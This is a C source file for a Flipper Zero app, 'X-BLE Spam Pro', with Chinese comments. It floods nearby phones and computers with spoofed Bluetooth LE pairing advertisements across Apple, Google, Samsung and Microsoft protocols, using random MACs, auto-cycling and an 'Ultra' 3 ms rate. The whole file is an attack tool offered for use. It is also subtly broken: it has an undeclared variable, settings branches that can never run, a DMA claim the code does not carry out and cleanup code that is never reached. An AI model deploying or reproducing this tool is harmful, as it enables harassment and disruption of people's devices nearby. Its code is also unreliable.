#include "ble_spam.h"
#include "ble_spam_i.h"
#include <furi.h>
#include <furi_hal_bt.h>
#include <gui/gui.h>
#include <gui/elements.h>
#include <input/input.h>
#include <stdlib.h>
#include <string.h>

// =============================================================================
// 全域狀態
// =============================================================================
static AttackConfig g_attack_config = {
    .mode = AttackMode_Random,
    .speed = SpeedMode_Normal,
    .random_mac = true,
    .interval_ms = 30,
    .count_per_device = 5,
    .cycle_delay_s = 3,
};

static bool g_is_running = false;
static FuriThread* g_attack_thread = NULL;
static ProtocolType g_current_protocol = Protocol_AppleContinuity;
static uint8_t g_tx_count = 0;
static bool g_auto_cycle_active = false;

// =============================================================================
// 協議驅動列表
// =============================================================================
extern const ProtocolDriver g_protocol_continuity;
extern const ProtocolDriver g_protocol_fastpair;
extern const ProtocolDriver g_protocol_easysetup;
extern const ProtocolDriver g_protocol_swiftpair;
extern const ProtocolDriver g_protocol_mdfe;
extern const ProtocolDriver g_protocol_nameflood;

static const ProtocolDriver* g_protocols[] = {
    &g_protocol_continuity,
    &g_protocol_fastpair,
    &g_protocol_easysetup,
    &g_protocol_swiftpair,
    &g_protocol_mdfe,
    &g_protocol_nameflood,
};

// =============================================================================
// 速度模式配置 - 優化延遲
// =============================================================================
static const struct {
    uint16_t interval_ms;
    const char* name;
} g_speed_modes[] = {
    {30,   "Normal"},
    {10,   "Fast"},
    {3,    "Ultra"},
};

// =============================================================================
// 輪播狀態
// =============================================================================
typedef struct {
    uint8_t protocol_idx;
    uint8_t device_idx;
    uint8_t packets_sent;
    uint32_t cycle_count;
    uint32_t total_packets;
} AutoCycleState;

static AutoCycleState g_cycle = {
    .protocol_idx = 0,
    .device_idx = 0,
    .packets_sent = 0,
    .cycle_count = 0,
    .total_packets = 0,
};

// =============================================================================
// UI 定義
// =============================================================================
#define MAX_DISPLAY_DEVICES 6

typedef enum {
    View_Main,
    View_ProtocolSelect,
    View_SpeedSelect,
    View_Settings,
    View_COUNT
} ViewType;

typedef struct {
    ViewType current_view;
    uint8_t selected_protocol;
    uint8_t selected_speed;
    uint8_t cycle_delay;   // 1-10 秒
    uint8_t packets_per_device; // 1-20
    bool random_mac;
    bool auto_cycle;
} UIState;

static UIState g_ui = {
    .current_view = View_Main,
    .selected_protocol = 0,
    .selected_speed = 0,
    .cycle_delay = 3,
    .packets_per_device = 5,
    .random_mac = true,
    .auto_cycle = false,
};

// =============================================================================
// 顯示繪製
// =============================================================================
static void draw_main_screen(Canvas* canvas, void* ctx) {
    UNUSED(ctx);
    UIState* ui = &g_ui;
    
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    
    // 標題欄
    canvas_draw_frame(canvas, 0, 0, 128, 12);
    canvas_draw_str(canvas, 3, 9, "X-BLE Spam Pro");
    canvas_draw_str(canvas, 85, 9, "v2.1");
    
    // 狀態顯示
    canvas_set_font(canvas, FontSecondary);
    if(g_is_running) {
        canvas_draw_str(canvas, 3, 20, "[SPAMMING]");
        
        // 當前協議
        const char* proto_name = g_protocols[g_current_protocol]->name;
        canvas_draw_str(canvas, 3, 29, proto_name);
        
        if(g_auto_cycle_active) {
            // 輪播模式顯示
            canvas_draw_str(canvas, 3, 38, "Mode: AUTO-CYCLE");
            char cycle_str[32];
            snprintf(cycle_str, sizeof(cycle_str), "Cyc:%lu Pkt:%lu",
                     g_cycle.cycle_count, g_cycle.total_packets);
            canvas_draw_str(canvas, 75, 38, cycle_str);
            
            // 進度指示
            char progress[16];
            uint8_t total_devs = g_protocols[g_current_protocol]->get_device_count();
            snprintf(progress, sizeof(progress), "%d/%d", 
                     g_cycle.device_idx + 1, total_devs);
            canvas_draw_str(canvas, 75, 29, progress);
        } else {
            // 單一模式
            canvas_draw_str(canvas, 3, 38, "Mode: Single");
        }
        
        // 速度指示
        canvas_draw_str(canvas, 3, 47, "Speed:");
        canvas_draw_str(canvas, 38, 47, g_speed_modes[ui->selected_speed].name);
        
        // 底部提示
        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 3, 62, "<OK>Stop  <Back>Exit");
    } else {
        // 停止狀態
        canvas_draw_str(canvas, 3, 20, "[STOPPED]");
        
        const char* proto_name = g_protocols[ui->selected_protocol]->name;
        canvas_draw_str(canvas, 3, 29, proto_name);
        
        // 速度和 MAC 設置
        canvas_draw_str(canvas, 3, 38, "Speed:");
        canvas_draw_str(canvas, 38, 38, g_speed_modes[ui->selected_speed].name);
        
        char mac_str[16];
        snprintf(mac_str, sizeof(mac_str), "MAC:%s", ui->random_mac ? "Rnd" : "Fix");
        canvas_draw_str(canvas, 80, 38, mac_str);
        
        if(ui->auto_cycle) {
            canvas_draw_str(canvas, 3, 47, "Auto-Cycle: ON");
            char delay_str[24];
            snprintf(delay_str, sizeof(delay_str), "Delay:%ds Pkt:%d",
                     ui->cycle_delay, ui->packets_per_device);
            canvas_draw_str(canvas, 75, 47, delay_str);
        } else {
            canvas_draw_str(canvas, 3, 47, "Auto-Cycle: OFF");
        }
        
        // 設備數量
        uint8_t dev_count = g_protocols[ui->selected_protocol]->get_device_count();
        char dev_str[24];
        snprintf(dev_str, sizeof(dev_str), "Devices: %d", dev_count);
        canvas_draw_str(canvas, 3, 56, dev_str);
        
        // 底部提示
        canvas_draw_str(canvas, 3, 62, "<OK>Start  <Up/Dn>Proto");
    }
}

static void draw_protocol_select(Canvas* canvas, void* ctx) {
    UNUSED(ctx);
    UIState* ui = &g_ui;
    
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_frame(canvas, 0, 0, 128, 12);
    canvas_draw_str(canvas, 3, 9, "Select Protocol");
    
    canvas_set_font(canvas, FontSecondary);
    for(int i = 0; i < Protocol_COUNT && i < 8; i++) {
        if(i == ui->selected_protocol) canvas_draw_str(canvas, 3, 20 + i * 7, ">");
        canvas_draw_str(canvas, 12, 20 + i * 7, g_protocols[i]->name);
    }
}

static void draw_settings(Canvas* canvas, void* ctx) {
    UNUSED(ctx);
    UIState* ui = &g_ui;
    
    canvas_clear(canvas);
    canvas_set_font(canvas, FontPrimary);
    canvas_draw_frame(canvas, 0, 0, 128, 12);
    canvas_draw_str(canvas, 3, 9, "Settings");
    
    canvas_set_font(canvas, FontSecondary);
    uint8_t y = 22;
    
    canvas_draw_str(canvas, 3, y, "Random MAC:");
    canvas_draw_str(canvas, 75, y, ui->random_mac ? "ON" : "OFF");
    y += 10;
    
    canvas_draw_str(canvas, 3, y, "Auto-Cycle:");
    canvas_draw_str(canvas, 75, y, ui->auto_cycle ? "ON" : "OFF");
    y += 10;
    
    if(ui->auto_cycle) {
        canvas_draw_str(canvas, 3, y, "Cycle Delay:");
        char delay_str[16];
        snprintf(delay_str, sizeof(delay_str), "%ds", ui->cycle_delay);
        canvas_draw_str(canvas, 75, y, delay_str);
        y += 10;
        
        canvas_draw_str(canvas, 3, y, "Packets/Dev:");
        char pkt_str[16];
        snprintf(pkt_str, sizeof(pkt_str), "%d", ui->packets_per_device);
        canvas_draw_str(canvas, 75, y, pkt_str);
    }
}

// =============================================================================
// 按鍵處理
// =============================================================================
static void input_callback(InputEvent* event, void* ctx) {
    UNUSED(ctx);
    UIState* ui = &g_ui;
    
    if(event->type != InputTypeShort && event->type != InputTypeRepeat) return;
    
    switch(ui->current_view) {
    case View_Main:
        if(event->key == InputKeyOk) {
            if(g_is_running) {
                g_is_running = false;
                g_auto_cycle_active = false;
            } else {
                g_current_protocol = ui->selected_protocol;
                g_auto_cycle_active = ui->auto_cycle;
                if(g_auto_cycle_active) {
                    g_cycle.protocol_idx = 0;
                    g_cycle.device_idx = 0;
                    g_cycle.packets_sent = 0;
                    g_cycle.cycle_count = 0;
                    g_cycle.total_packets = 0;
                }
                g_is_running = true;
                g_tx_count = 0;
            }
        } else if(event->key == InputKeyUp) {
            ui->current_view = View_ProtocolSelect;
        } else if(event->key == InputKeyDown) {
            ui->current_view = View_Settings;
        } else if(event->key == InputKeyLeft) {
            if(ui->selected_speed > 0) ui->selected_speed--;
            g_attack_config.speed = ui->selected_speed;
            g_attack_config.interval_ms = g_speed_modes[ui->selected_speed].interval_ms;
        } else if(event->key == InputKeyRight) {
            if(ui->selected_speed < 2) ui->selected_speed++;
            g_attack_config.speed = ui->selected_speed;
            g_attack_config.interval_ms = g_speed_modes[ui->selected_speed].interval_ms;
        } else if(event->key == InputKeyBack) {
            // 退出應用
        }
        break;
        
    case View_ProtocolSelect:
        if(event->key == InputKeyOk || event->key == InputKeyBack) {
            ui->current_view = View_Main;
        } else if(event->key == InputKeyUp) {
            if(ui->selected_protocol > 0) ui->selected_protocol--;
        } else if(event->key == InputKeyDown) {
            if(ui->selected_protocol < Protocol_COUNT - 1) ui->selected_protocol++;
        }
        break;
        
    case View_Settings:
        if(event->key == InputKeyOk || event->key == InputKeyBack) {
            ui->current_view = View_Main;
        } else if(event->key == InputKeyUp) {
            // 滾動設置選項
        } else if(event->key == InputKeyDown) {
            // 滾動設置選項
        } else if(event->key == InputKeyOk) {
            if(ui->selected_protocol == 0) {
                ui->random_mac = !ui->random_mac;
                g_attack_config.random_mac = ui->random_mac;
            } else if(ui->selected_protocol == 1) {
                ui->auto_cycle = !ui->auto_cycle;
            }
        }
        break;
        
    default:
        ui->current_view = View_Main;
        break;
    }
}

// =============================================================================
// 攻擊線程 - 優化版
// =============================================================================
static int32_t attack_thread(void* ctx) {
    UNUSED(ctx);
    
    uint8_t* packet = NULL;
    uint8_t size = 0;
    uint8_t last_protocol = 0xFF;
    uint8_t last_device = 0xFF;
    uint32_t stall_count = 0;
    
    while(g_is_running) {
        // 自動輪播邏輯
        if(g_auto_cycle_active) {
            ProtocolType target_protocol = g_cycle.protocol_idx;
            if(target_protocol >= Protocol_COUNT) {
                target_protocol = 0;
                g_cycle.protocol_idx = 0;
            }
            
            const ProtocolDriver* driver = g_protocols[target_protocol];
            uint8_t max_devices = driver->get_device_count();
            
            if(max_devices > 0 && g_cycle.device_idx >= max_devices) {
                g_cycle.device_idx = 0;
                g_cycle.protocol_idx++;
                if(g_cycle.protocol_idx >= Protocol_COUNT) {
                    g_cycle.protocol_idx = 0;
                    g_cycle.cycle_count++;
                }
                g_cycle.packets_sent = 0;
            }
            
            // 如果當前協議改變了，更新 g_current_protocol
            if(target_protocol != last_protocol) {
                g_current_protocol = target_protocol;
                last_protocol = target_protocol;
            }
            
            // 設置配置使用特定設備
            g_attack_config.mode = AttackMode_Single;
            g_attack_config.target_device_idx = g_cycle.device_idx;
            
            // 增加 packet 計數
            g_cycle.packets_sent++;
            g_cycle.total_packets++;
            
            // 每個設備發送指定數量後切換
            if(g_cycle.packets_sent >= g_ui.packets_per_device) {
                g_cycle.device_idx++;
                g_cycle.packets_sent = 0;
            }
            
            // 延遲
            furi_delay_tick(ui->cycle_delay * 100);
        } else {
            // 單一協議模式
            g_attack_config.mode = AttackMode_Random;
        }
        
        // 構建數據包
        size = g_protocols[g_current_protocol]->build_packet(&size, &packet, &g_attack_config);
        
        if(size > 0 && packet != NULL) {
            // 發送數據包 - 帶錯誤處理
            uint32_t tx_start = furi_get_tick();
            bool tx_success = furi_hal_bt_tx(&packet[1], size - 1);
            
            if(tx_success) {
                g_tx_count++;
                stall_count = 0;
            } else {
                stall_count++;
                if(stall_count > 10) {
                    // 如果連續發送失敗，嘗試重新初始化藍牙
                    FURI_LOG_W("BLE_SPAM", "TX stall detected, resetting BT");
                    furi_hal_bt_deinit();
                    furi_delay_tick(100);
                    furi_hal_bt_init();
                    stall_count = 0;
                }
            }
            
            free(packet);
            packet = NULL;
        }
        
        // 速度模式延遲
        uint16_t delay = g_speed_modes[g_attack_config.speed].interval_ms;
        
        // Ultra 模式使用 DMA 直接寫入減少延遲
        if(g_attack_config.speed == SpeedMode_Ultra) {
            delay = 3;
            // 在 Ultra 模式下，使用更快的廣播間隔
            // 注意：這可能導致藍牙堆棧不穩定
        }
        
        furi_delay_tick(delay);
    }
    
    return 0;
}

// =============================================================================
// 應用程序入口
// =============================================================================
static int32_t ble_spam_app(void* p) {
    UNUSED(p);
    
    srand(furi_get_tick());
    
    Gui* gui = furi_record_open("gui");
    ViewPort* vp = view_port_alloc();
    view_port_draw_callback_set(vp, draw_main_screen, NULL);
    view_port_input_callback_set(vp, input_callback, NULL);
    gui_add_view_port(gui, vp, GuiLayerFullscreen);
    
    furi_hal_bt_init();
    
    g_attack_thread = furi_thread_alloc();
    furi_thread_set_callback(g_attack_thread, attack_thread);
    furi_thread_start(g_attack_thread);
    
    while(1) {
        furi_delay_tick(50);
        view_port_update(vp);
    }
    
    g_is_running = false;
    furi_thread_free(g_attack_thread);
    furi_hal_bt_deinit();
    view_port_enabled_set(vp, false);
    gui_remove_view_port(gui, vp);
    view_port_free(vp);
    furi_record_close("gui");
    
    return 0;
}

int32_t main(int32_t argc, char** argv) {
    UNUSED(argc);
    UNUSED(argv);
    return ble_spam_app(NULL);
}